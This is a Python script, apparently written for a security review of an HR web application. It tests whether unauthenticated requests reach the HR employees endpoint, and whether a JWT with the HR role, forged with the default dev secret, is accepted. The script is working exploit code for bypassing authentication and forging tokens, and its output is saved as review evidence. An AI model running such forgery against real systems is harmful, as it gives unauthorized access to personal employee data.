#!/usr/bin/env python3
"""
P-145 — kiểm 2 rủi ro cấu hình nghiêm trọng:
  (A) DEV_BYPASS_AUTH: gọi endpoint HR KHÔNG token -> nếu 200 nghĩa là bypass auth đang bật.
  (B) JWT forge: tự ký token HR bằng secret dev mặc định (config.py: jwt_secret
      "dev-only-change-me-insecure-local-secret") -> nếu server chấp nhận => secret chưa override.
Tài khoản thật: <REDACTED_EMAIL> / <REDACTED_PASSWORD>
"""
import json, time, uuid
import jwt, requests
B = "https://<REDACTED_DEPLOY>/api/v1"
OUT = "/home/hieubt15/Documents/demo-review-cohort4/reviews/P-145/evidences"
DEV_SECRET = "dev-only-change-me-insecure-local-secret"
out = {"ts": time.strftime("%Y-%m-%d %H:%M:%S%z"), "base": B}

# login thật để lấy token + khám phá cấu trúc claim
r = requests.post(f"{B}/auth/login", json={"email": "<REDACTED_EMAIL>", "password": "<REDACTED_PASSWORD>"}, timeout=30)
out["login_status"] = r.status_code
login = r.json() if r.ok else r.text
out["login_body_keys"] = list(login.keys()) if isinstance(login, dict) else login
real_token = login.get("access_token") or login.get("token") if isinstance(login, dict) else None
print("login:", r.status_code, out["login_body_keys"])

# giải mã token thật (không verify) để lấy sub/role/employee_id thực
if real_token:
    claims = jwt.decode(real_token, options={"verify_signature": False})
    out["real_claims"] = claims
    print("real claims:", claims)

# (A) DEV_BYPASS: gọi HR endpoint KHÔNG token
r0 = requests.get(f"{B}/hr/employees", timeout=30)
out["no_token_hr_employees"] = {"status": r0.status_code, "body": r0.text[:160]}
out["dev_bypass_on"] = (r0.status_code == 200)
print(f"[A] no-token GET /hr/employees -> {r0.status_code} (dev_bypass_on={out['dev_bypass_on']})")

# (B) forge HR token bằng dev secret
now = int(time.time())
sub = (out.get("real_claims") or {}).get("sub") or str(uuid.uuid4())
forged_claims = {"sub": sub, "email": "attacker@evil.test", "role": "hr", "employee_id": None,
                 "iat": now, "exp": now + 3600}
# copy các field chuẩn nếu token thật có (iss/aud/token_type)
for k in ("iss", "aud", "type", "token_type", "must_change_password"):
    if k in (out.get("real_claims") or {}):
        forged_claims[k] = out["real_claims"][k]
forged = jwt.encode(forged_claims, DEV_SECRET, algorithm="HS256")
out["forged_claims"] = forged_claims
rf = requests.get(f"{B}/hr/employees", headers={"Authorization": f"Bearer {forged}"}, timeout=30)
out["forged_hr_employees"] = {"status": rf.status_code, "body": rf.text[:300]}
out["jwt_forge_works"] = (rf.status_code == 200)
print(f"[B] forged-HR GET /hr/employees -> {rf.status_code} (forge_works={out['jwt_forge_works']})")

json.dump(out, open(f"{OUT}/01_auth_forge.json", "w"), ensure_ascii=False, indent=2, default=str)
print("saved ->", f"{OUT}/01_auth_forge.json")
